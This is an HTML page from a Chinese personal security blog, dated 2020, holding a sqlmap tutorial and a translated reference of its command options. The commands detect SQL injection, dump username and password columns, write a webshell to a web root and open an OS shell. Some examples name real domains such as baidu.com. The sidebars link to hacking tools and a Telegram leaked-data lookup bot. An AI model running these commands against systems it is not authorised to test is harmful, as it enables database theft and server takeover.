@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Sqlmap</title>
+	<meta charset="utf-8">
+	<meta name="keyword" content="个人博客、个人笔记、网络安全、信息安全、">
+	<meta name="description" content="本博客是一个记录博主笔记和的一个网站">
+	<meta name="viewport" content="width = device-width,initial-scale=1">
+	<link rel="icon" type="image/x-icon" href="./image/title.png" />
+	<link rel="stylesheet" type="text/css" href="css/content.css">
+	<link rel="stylesheet" href="font-awesome-4.7.0\css\font-awesome.min.css">
+	<audio autoplay="" loop=""><source src="./music/御剑江湖.mp3"></audio>
+	<style type="text/css"></style>	
+</head>
+<body>	
+		
+	<canvas id="christmasCanvas" style="top: 0px; left: 0px; width: 100%; height: 100%; z-index: 5000; position: fixed; pointer-events: none; " >
+	</canvas>
+<script type="text/javascript">
+  var snow = function() {
+    if(1==1) {
+      var b = document.getElementById("christmasCanvas"), 
+          a = b.getContext("2d"), 
+          d = window.innerWidth, 
+          c = window.innerHeight;
+      b.width = d;
+      b.height = c;
+      for(var e = [], b = 0;b < 70;b++) {
+        e.push({x:Math.random() * d, 
+                y:Math.random() * c, 
+                r:Math.random() * 4 + 1, 
+                d:Math.random() * 70})
+      }
+      var h = 0;
+      window.intervral4Christmas = setInterval(function() {
+        a.clearRect(0, 0, d, c);
+        a.fillStyle = "rgba(255 245 238)";
+        a.shadowBlur = 5;
+        a.shadowColor = "rgba(255 193 193)";
+        a.beginPath();
+        for(var b = 0;b < 70;b++) {
+          var f = e[b];
+          a.moveTo(f.x, f.y);
+          a.arc(f.x, f.y, f.r, 0, Math.PI * 2, !0)
+        }
+        a.fill();
+        h += 0.01;
+        for(b = 0;b < 70;b++) {
+          if(f = e[b], f.y += Math.cos(h + f.d) + 1 + f.r / 2, 
+            f.x += Math.sin(h) * 2, f.x > d + 5 || f.x < -5 || f.y > c) {
+            e[b] = b % 3 > 0 ? {x:Math.random() * d, y:-10, r:f.r, d:f.d} : 
+            Math.sin(h) > 0 ? {x:-5, y:Math.random() * c, r:f.r, d:f.d} : 
+            {x:d + 5, y:Math.random() * c, r:f.r, d:f.d}
+          }
+        }
+      }, 70)
+    }
+  }
+  snow();
+</script>
+	<div class="nav">
+		<div class="menu">
+				<ul>
+					<li style=" width:60px;  margin: 0px; text-align: center;">
+						<a href="index.html" style="margin-right:20px;">首页</a>
+					</li>
+					<li>	
+						<a href="#">漏洞查询平台</a>
+						<ul class="nav2" style="">
+							<li>
+								<a href="https://www.exploit-db.com/">Exploit</a>
+							</li>	
+							<li>
+								<a href="https://www.seebug.org/">seebug</a>
+							</li>
+							<li>	
+								<a href="http://0day5.com/">漏洞时代</a>
+							</li>
+						</ul>
+					</li>	
+					<li>
+						<a href="#">安全视频平台</a>
+						<ul class="nav2">
+							<li>
+								<a href="http://open.freebuf.com/">freebuf课程</a>
+							</li>	
+							<li>		
+								<a href="https://edu.51cto.com/courselist/index.html?q=%E5%AE%89%E5%85%A8">51CTO学院</a>
+							</li>	
+							<li>
+								<a href="https://edu.aqniu.com/">安全牛课堂</a>
+							</li>
+							
+						</ul>						
+					</li>	
+					<li>
+						<a href="#">HackingTools</a>
+						<ul class="nav2">
+							<li>
+								<a href="http://www.durkadevi.com/sound/scan.php">SqliScan</a>
+							</li>	
+							
+							<li>		
+								<a href="http://nmap.online-domain-tools.com/">Nmap Scan</a>
+							</li>	
+
+							<li>
+								<a href="http://xss-scanner.com/">Xss Scan</a>
+							</li>								
+							
+							<li>
+								<a href="https://www.ddosi.com/mm.html">字典生成器</a>
+							</li>					
+						</ul>						
+					</li>							
+					<li>
+						<a href="#">加密解密</a>
+						<ul class="nav2">
+							<li>
+								<a href="https://www.somd5.com/">Somd5解密</a>
+							</li>
+							<li>
+								<a href="https://md5jiami.51240.com/">Md5在线加密</a>
+							</li>
+							<li>
+								<a href="https://www.ddosi.com/mm.html">随机密码生成</a>
+							</li>
+						</ul>		
+					</li>
+					<li>
+						<a href="#">技能树</a>
+						<ul class="nav2">
+							<li>
+								<a href="#">知道创宇</a>
+							</li>
+							<li>
+								<a href="#">web安全导图</a>
+							</li>
+							<li>
+								<a href="#">metasploit</a>
+							</li>
+							<li>
+								<a href="#">Kali linux</a>
+							</li>							
+						</ul>
+					</li>	
+					<li>
+						<a href="#">渗透测试</a>
+						<ul class="nav2">
+							<li>
+								<a href="https://www.reg007.com/">注册查询</a>
+							</li>	
+							<li>		
+								<a href="https://fofa.so//">FOFA搜索</a>
+							</li>	
+							<li>
+								<a href="https://www.shodan.io/">shodan搜索</a>
+							</li>
+							
+						</ul>						
+					</li>							
+				</ul>
+					<div class="Login">
+						<ul>
+							<a href="Login.html" class="fa fa-user" > 登录</a>
+						</ul>
+					</div>	
+		</div>	
+	</div>	
+	<!--<input class="search" type="text" name="search">
+		<input class="submit" type="submit" name="" value="搜素">
+	-->
+<div class="bigdiv">	
+	
+		<div class="Lcontent">
+			<span class= "onesp">标签 ₪ ℒ ℒ ₪</span>
+			<a href="#" class="la">Burpsuite</a>
+			<a href="#" class="la">Cupture the flag</a>
+			<a href="#" class="la">Domian name sever</a>
+			<a href="#" class="la">Kali linxu</a>
+			<a href="#" class="la">Metasploit</a>
+			<a href="#" class="la">Netsparker</a>
+			<a href="#" class="la">Nmap</a>
+			<a href="#" class="la">Tor Router</a>
+			<a href="#" class="la">Xml注入</a>
+			<a href="#" class="la">隐私防护</a>
+			<a href="#" class="la">代码审计</a>
+			<a href="#" class="la">信息安全</a>
+			<a href="#" class="la">免杀</a>
+			<a href="#" class="la">在线工具</a>
+			<a href="#" class="la">数据泄露</a>
+			<a href="#" class="la">社会工程学</a>
+			<a href="#" class="la">暴力破解</a>
+			<a href="#" class="la">Hacking Tools</a>
+			<a href="#" class="la">Virus</a>
+			<a href="#" class="la">Html</a>
+		</div>
+
+		<div class="Content">
+			<h1>2.Sqlmap使用</h1>
+				<div class="entry_header">
+	                <time>2020/9月/26日</time>
+	                &nbsp;
+	                by
+	                <a class="fa fa-user-secret" href="#">Psycho</a>
+	                &nbsp;
+	                <a class="fa fa-commenting" href="#">0条评论</a>
+	   
+	                <a class="fa fa-thumbs-up" href="#">0</a>
+            	</div>			
+                <p class="words">
+				sqlmap支持的数据库有:
+				</p>
+                <p class="words"
+                >MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+                	<br>
+                </p>
+                    <br>
+                 <p class="words">    
+                  	●检测注入
+                  	<br>
+                    ●基本格式:
+                    <br>
+	                <br>qlmap -u “http://www.vuln.cn/post.php?id=1”  
+					<br>默认使用level1检测全部数据库类型
+					<br>sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3
+					<br>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）			
+                 </p>
+                    <br>
+                 <p class="words">    
+                    
+                    ●跟随302跳转: <br>
+					 <br>当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，
+					 <br>当注入错误的时候，先报错再跳转的时候，不需要跟随302。
+					 <br>目的就是：要追踪到错误信息。                    
+                 </p>
+                 <p class="words">    
+                    ●cookie注入: <br>
+					 <br>当程序有防get注入的时候，可以使用cookie注入
+					 <br>sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2（只有level达到2才会检测cookie）
+                </p>
+                 <p class="words">
+                    ●从post数据包中注入:<br>
+                    <br>可以使用burpsuite或者temperdata等工具来抓取post包<br>
+					<br>sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql  指定username参数<br>
+                </p>
+                <p class="words">
+	                ●注入成功后<br>
+					●获取数据库基本信息:<br>
+					<br>sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 –dbs
+					查询有哪些数据库<br>
+					<br>
+					sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables
+					查询test数据库中有哪些表<br>
+					<br>
+					sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns
+					查询test数据库中admin表有哪些字段<br>
+					<br>
+					sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump
+					<br>
+					<br>dump出字段username与password中的数据<br>
+					<br>
+					其他命令参考下面
+					<br>
+				</p>	
+				<p class="words">
+					●从数据库中搜索字段:<br>
+					<br>sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password<br>
+					<br>在dedecms数据库中搜索字段admin或者password。<br>
+				</p>
+				<p class="words">
+					●读取与写入文件:<br>
+					<br>首先找需要网站的物理路径，其次需要有可写或可读权限。<br>
+					<br>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br>
+					<br>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br>
+					<br>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br>
+				</p>
+                <p class="words">
+                	●示例：<br>
+                	<br> sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”<br>
+                	<br>●使用shell命令：<br>
+					<br>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell<br>
+					<br>接下来指定网站可写目录：<br>
+					<br>“E:\php\htdocs\dvwa”<br>
+					<br>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）<br>
+                </p>                                                                                                            
+				<p class="words">
+               		●sqlmap详细命令：<br>
+               			<br>• –is-dba 当前用户权限 (是否为root权限)<br>
+               			<br>• –dbs (所有数据库)<br>
+               			<br>• –current-db (网站当前数据库)<br>
+               			<br>• –users (所有数据库用户)<br>
+               			<br>• –current-user 当前数据库用户<br>
+               			<br>• –random-agent 构造随机user-agent<br>
+               			<br>• –proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理<br>
+               			<br>• –time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）<br>
+     			</p>
+				<p class="words">
+               		●Options(选项:)<br>
+               			<br>• –version (显示程序的版本号并退出)<br>
+               			<br>• -h, –help (显示此帮助消息并退出)<br>
+               			<br>• -v VERBOSE 详细级别：0-6（默认为1）<br>
+               			<br>• 保存进度继续跑：<br>
+               			<br>• sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log”  保存进度<br>
+               			<br>• sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度<br>
+     			</p>
+     			<p class="words">
+     				●Target（目标）:<br>
+     				<br>以下至少需要设置其中一个选项，设置目标URL。<br>
+     				<br>• -d DIRECT 直接连接到数据库。<br>
+     				<br>• -u URL, –url=URL 目标URL。<br>
+     				<br>• -l LIST 从Burp或WebScarab代理的日志中解析目标。<br>
+     				<br>• -r REQUESTFILE 从一个文件中载入HTTP请求。<br>
+     				<br>• -g GOOGLEDORK 处理Google dork的结果作为目标URL<br>
+     				<br>• -c CONFIGFILE 从INI配置文件中加载选项。<br>
+     			</p>
+     			<p class="words">
+     				●Request（请求):<br>
+     				<br>这些选项可以用来指定如何连接到目标URL。<br>
+     				<br>• –data=DATA 通过POST发送的数据字符串<br>
+     				<br>• –cookie=COOKIE HTTP Cookie头<br>
+     				<br>• –cookie-urlencode URL 编码生成的cookie注入<br>
+     				<br>• –drop-set-cookie 忽略响应的Set – Cookie头信息<br>
+     				<br>• –user-agent=AGENT 指定 HTTP User – Agent头<br>
+     				<br>• –random-agent 使用随机选定的HTTP User – Agent头<br>
+     				<br>• –referer=REFERER 指定 HTTP Referer头<br>
+     				<br>• –headers=HEADERS 换行分开，加入其他的HTTP头<br>
+     				<br>• –auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM<br>
+     				<br>• –auth-cred=ACRED HTTP身份验证凭据（用户名:密码）<br>
+     				<br>• –auth-cert=ACERT HTTP认证证书（key_file，cert_file）<br>
+     				<br>• –proxy=PROXY 使用HTTP代理连接到目标URL<br>
+     				<br>• –ignore-proxy 忽略系统默认的HTTP代理<br>
+     				<br>• –delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒<br>
+     				<br>• –timeout=TIMEOUT 等待连接超时的时间（默认为30秒）<br>
+     				<br>• –retries=RETRIES 连接超时后重新连接的时间（默认3）<br>
+     				<br>• –scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式<br>
+     				<br>• –safe-url=SAFURL 在测试过程中经常访问的url地址<br>
+     				<br>• –safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL<br>
+     			</p>
+    			<p class="words">
+     				●Enumeration（枚举）：<br>
+     				<br>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行
+					您自己的SQL语句。<br>
+					<br>• -b, –banner 检索数据库管理系统的标识<br>
+					<br>• –current-user 检索数据库管理系统当前用户<br>
+					<br>• –current-db 检索数据库管理系统当前数据库<br>
+					<br>• –is-dba 检测DBMS当前用户是否DBA<br>
+					<br>• –users 枚举数据库管理系统用户<br>
+					<br>• –passwords 枚举数据库管理系统用户密码哈希<br>
+					<br>• –privileges 枚举数据库管理系统用户的权限<br>
+					<br>• –roles 枚举数据库管理系统用户的角色<br>
+					<br>• –dbs 枚举数据库管理系统数据库<br>
+					<br>• -D DBname 要进行枚举的指定数据库名<br>
+					<br>• -T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）<br>
+					<br>• –tables 枚举的DBMS数据库中的表<br>
+					<br>• –columns 枚举DBMS数据库表列<br>
+					<br>• –dump 转储数据库管理系统的数据库中的表项<br>
+					<br>• –dump-all 转储所有的DBMS数据库表中的条目<br>
+					<br>• –search 搜索列（S），表（S）和/或数据库名称（S）<br>
+					<br>• -C COL 要进行枚举的数据库列<br>
+					<br>• -U USER 用来进行枚举的数据库用户<br>
+					<br>• –exclude-sysdbs 枚举表时排除系统数据库<br>
+					<br>• –start=LIMITSTART 第一个查询输出进入检索<br>
+					<br>• –stop=LIMITSTOP 最后查询的输出进入检索<br>
+					<br>• –first=FIRSTCHAR 第一个查询输出字的字符检索<br>
+					<br>• –last=LASTCHAR 最后查询的输出字字符检索<br>
+					<br>• –sql-query=QUERY 要执行的SQL语句<br>
+					<br>• –sql-shell 提示交互式SQL的shell<br>
+
+
+
+
+     			</p>  
+    			<p class="words">
+     				●Optimization（优化）：<br>
+     				<br>这些选项可用于优化SqlMap的性能。<br>
+					<br>• -o 开启所有优化开关<br>
+					<br>• –predict-output 预测常见的查询输出<br>
+					<br>• –keep-alive 使用持久的HTTP（S）连接<br>
+					<br>• –null-connection 从没有实际的HTTP响应体中检索页面长度<br>
+					<br>• –threads=THREADS 最大的HTTP（S）请求并发量（默认为1）<br>
+	
+     			</p>  
+    			<p class="words">
+     				●Injection（注入）：<br>
+     				<br>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。<br>
+					<br>• -p TESTPARAMETER 可测试的参数（S）<br>
+					<br>• –dbms=DBMS 强制后端的DBMS为此值<br>
+					<br>• –os=OS 强制后端的DBMS操作系统为这个值<br>
+					<br>• –prefix=PREFIX 注入payload字符串前缀<br>
+					<br>• –suffix=SUFFIX 注入payload字符串后缀<br>
+					<br>• –tamper=TAMPER 使用给定的脚本（S）篡改注入数据<br>
+		
+     			</p>
+    			<p class="words">
+     				●Detection（检测）：<br>
+     				<br>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。<br>
+					<br>• –level=LEVEL 执行测试的等级（1-5，默认为1）<br>
+					<br>• –risk=RISK 执行测试的风险（0-3，默认为1）<br>
+					<br>• –string=STRING 查询时有效时在页面匹配字符串<br>
+					<br>• –regexp=REGEXP 查询时有效时在页面匹配正则表达式<br>
+					<br>• –text-only 仅基于在文本内容比较网页<br>
+		
+     			</p>   
+    			<p class="words">
+     				●Techniques（技巧）：<br>
+     				<br>这些选项可用于调整具体的SQL注入测试。<br>
+					<br>• –technique=TECH SQL注入技术测试（默认BEUST）<br>
+					<br>• –time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）<br>
+					<br>• –union-cols=UCOLS 定列范围用于测试UNION查询注入<br>
+					<br>• –union-char=UCHAR 用于暴力猜解列数的字符<br>
+     			</p>
+    			<p class="words">
+     				●Fingerprint（指纹）：<br>
+     				<br>-f, –fingerprint 执行检查广泛的DBMS版本指纹<br>
+     			</p>   
+    			<p class="words">
+     				●Brute force（蛮力）：<br>
+					<br>这些选项可以被用来运行蛮力检查。<br>
+					<br>• –common-tables 检查存在共同表<br>
+					<br>• –common-columns 检查存在共同列<br>
+					<br>●User-defined function injection（用户自定义函数注入）：<br>
+					<br>这些选项可以用来创建用户自定义函数。<br>
+					<br>• –udf-inject 注入用户自定义函数<br>
+					<br>• –shared-lib=SHLIB 共享库的本地路径<br>
+
+     				
+     			</p>
+    			<p class="words">
+     				●File system access（访问文件系统）：<br>
+			     	<br>这些选项可以被用来访问后端数据库管理系统的底层文件系统。<br>
+					<br>• –file-read=RFILE 从后端的数据库管理系统文件系统读取文件<br>
+					<br>• –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件<br>
+					<br>• –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br>
+     			</p>   
+    			<p class="words">
+     				●Operating system access（操作系统访问）：<br>
+				     <br>这些选项可以用于访问后端数据库管理系统的底层操作系统。<br>
+					<br>• –os-cmd=OSCMD 执行操作系统命令<br>
+					<br>• –os-shell 交互式的操作系统的shell<br>
+					<br>• –os-pwn 获取一个OOB shell，meterpreter或VNC<br>
+					<br>• –os-smbrelay 一键获取一个OOB shell，meterpreter或VNC<br>
+					<br>• –os-bof 存储过程缓冲区溢出利用<br>
+					<br>• –priv-esc 数据库进程用户权限提升<br>
+					<br>• –msf-path=MSFPATH Metasploit Framework本地的安装路径<br>
+					<br>• –tmp-path=TMPPATH 远程临时文件目录的绝对路径<br>
+				
+     			</p>   
+    			<p class="words">
+     				●Windows注册表访问：<br>
+				    <br>这些选项可以被用来访问后端数据库管理系统Windows注册表。<br>
+					<br>• –reg-read 读一个Windows注册表项值<br>
+					<br>• –reg-add 写一个Windows注册表项值数据<br>
+					<br>• –reg-del 删除Windows注册表键值<br>
+					<br>• –reg-key=REGKEY Windows注册表键<br>
+					<br>• –reg-value=REGVAL Windows注册表项值<br>
+					<br>• –reg-data=REGDATA Windows注册表键值数据<br>
+					<br>• –reg-type=REGTYPE Windows注册表项值类型<br>
+					<br>这些选项可以用来设置一些一般的工作参数。<br>
+					<br>• -t TRAFFICFILE 记录所有HTTP流量到一个文本文件中<br>
+					<br>• -s SESSIONFILE 保存和恢复检索会话文件的所有数据<br>
+					<br>• –flush-session 刷新当前目标的会话文件<br>
+					<br>• –fresh-queries 忽略在会话文件中存储的查询结果<br>
+					<br>• –eta 显示每个输出的预计到达时间<br>
+					<br>• –update 更新SqlMap<br>
+					<br>• –save file保存选项到INI配置文件<br>
+					<br>• –batch 从不询问用户输入，使用所有默认配置。<br>			
+     			</p>   
+    			<p class="words">
+     				●Miscellaneous（杂项）：<br>
+				    <br>• –beep 发现SQL注入时提醒<br>
+					<br>• –check-payload IDS对注入payloads的检测测试<br>
+					<br>• –cleanup SqlMap具体的UDF和表清理DBMS<br>
+					<br>• –forms 对目标URL的解析和测试形式<br>
+					<br>• –gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果<br>
+					<br>• –page-rank Google dork结果显示网页排名（PR）<br>
+					<br>• –parse-errors 从响应页面解析数据库管理系统的错误消息<br>
+					<br>• –replicate 复制转储的数据到一个sqlite3数据库<br>
+					<br>• –tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址<br>
+					<br>• –wizard 给初级用户的简单向导界面<br>			
+     			</p>        			     			     			     			     			    			
+		</div>	
+					
+		<div class="Rcontent">
+			<span class="foursp">Web/Wi-fi安全书籍</span>
+			<h1 class="Webanquan"><i class="fa fa-book" aria-hidden="true">Web安全书籍:</i></h1>
+			<ul>
+				<li class="ri"><a href="https://edu.heibai.org/01%20Web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90.pdf">Web安全深度剖析</a>
+				</li>
+				<li class="ri"><a href="https://edu.heibai.org/?dir=/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">安全思维导图</a>
+				</li>
+				<li class="ri"><a href="https://edu.heibai.org/05%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1.pdf">Xss跨站脚本剖析</a>
+				</li>
+				<li class="ri"><a href="https://edu.heibai.org/04%20SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1++%E7%AC%AC2%E7%89%88.pdf">Sql注入与防御</a>
+				</li>	
+				<h1 class="WiFianquan"><i class="fa fa-wifi" aria-hidden="true"></i>WiFi安全书籍:</i></h1>			
+				 <li class="ri"><a href="https://edu.heibai.org/%E8%BF%91%E6%BA%90%E6%B8%97%E9%80%8F%E4%B9%8B%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E7%9C%8BWiFi.pdf">近源渗透Wifi</a>
+				</li>
+				 <li class="ri"><a href="https://pan.baidu.com/s/1pKKXXr1">家用路由器0day漏洞挖掘</a>
+				</li>	
+				 <li class="ri"><a href="https://pan.baidu.com/s/1nuRN6Sp">无线攻防进阶	</a>
+				</li>																	
+			</ul>
+		</div>
+
+		<div class="Lcontent">
+			<span class= "twosp">在线工具</span>
+			<h1 class="shegong">☣ 社工查询:</h1>
+			<ul>
+				<li class="li2"><a href="#">天眼查(公司/企业/CEO/法人)</a></li>
+				<li class="li2"><a href="#">reg007(注册信息查询)</a></li>
+				<li class="li2"><a href="#">FoFA(网络空间搜索引擎)</a></li>
+				<li class="li2"><a href="#">Telegram(社工裤机器人)</a></li>
+			</ul>
+		</div>
+		<div class="Comments">
+			<h1 style="margin-top: 750px;"><a href="Login.html" style=" font-size: 300%;"><i class="fa fa-shield" aria-hidden="true">登陆后可查看评论区 </i></a></h1>
+		</div>
+
+		<div class="Rcontent">
+			<span class="fivesp">PHP/Python/Android书籍</span>
+			<h1 class="PHP"><i class="fa fa-book" aria-hidden="true">PHP书籍:</i></h1>
+			<ul>
+				<li class="ri2"><a href="https://phpaudit.books.virzz.com/">PHP代码审计</a></li>
+				<h1 class="Python"><i class="fa fa-book" aria-hidden="true">Python书籍:</i></h1>
+				<li class="ri2"><a href="https://pan.baidu.com/s/1b65k9S">python安全编程</a></li>
+				<h1 class="Python"><i class="fa fa-book" aria-hidden="true">Android书籍:</i></h1>
+				<li class="ri2"><a href="https://pan.baidu.com/s/1kVsVYlD">OWASP TOP10移动安全漏洞（安卓）</a></li>
+				<h1 class="Poc"><i class="fa fa-book" aria-hidden="true">POC书籍:</i></h1>
+				<li class="ri2"><a href="https://poc.evalbug.com/index.html">Poc编写指南</a></li>
+			</ul>			
+		</div>
+
+		<div class="Lcontent" style="position: absolute; top: 1260px;">
+			<span class= "threesp">☬ 病毒防御自检:</span>
+			<ul>
+				<li class="li3"><a href="#">VisualTotal在线病毒查杀</a></li>
+				<li class="li3"><a href="#">腾讯哈勃分析系统</a></li>
+				<li class="li3"><a href="#">virscan(病毒木马在线查杀)</a></li>
+			</ul>
+			<h1 class="webshell">☣ WebShell查杀:</h1>
+			<ul>
+				<li class="li3"><a href="https://www.shellpub.com/">河马Shell查杀</a></li>
+				<li class="li3"><a href="https://scanner.baidu.com/#/pages/intro">百度shell查杀</a></li>
+				<li class="li3"><a href="http://www.d99net.net">D盾shell查杀</a></li>
+			</ul>			
+		</div>
+	<div class="Rcontent">
+			<span class="Sixsp">渗透测试/安全运维</span>
+			<h1 class="shentou"><i class="fa fa-laptop" aria-hidden="true">渗透测试</i>:</h1>
+			<ul>
+				<li class="ri3"><a href="#">Wireshark 用户手册</a></li>
+				<li class="ri3"><a href="#">渗透测试实践指南</a></li>
+				<li class="ri3"><a href="#">高安全环境渗透</a></li>	
+				<li class="ri3"><a href="#">Kali Linux中文文档</a></li>
+			</ul>
+			<h1 class="yunwei"><i class="fa fa-laptop" aria-hidden="true">安全运维</i>:</h1>
+				<li class="ri3"><a href="https://pan.baidu.com/s/1hsgQYpQ">日志分析技巧</a></li>	
+				<li class="ri3"><a href="https://pan.baidu.com/s/1o81D6x8">日志管理与分析权威指南</a></li>
+		</div>
+	<div class="footer">
+		<p style="display: inline-block; margin-top: 25px;"> 「Copyright © 2020:Guypsycho.blog's」</p>
+
+			<div class="misc">
+				<ul >
+					<li>
+						<a href="About.html">关于博客</a>
+					</li>
+					<li>
+						<a href="#">友情链接：</a>
+					</li>
+					<li>
+
+						<a href="https://www.heibai.org/">黑白网</a>
+					</li>					
+					<li>
+						<a href="https://edu.heibai.org//">黑白资源网</a>
+					</li>						
+				</ul>
+			</div>	
+	</div>	
+</div>
+
+
+</body>
+</html>
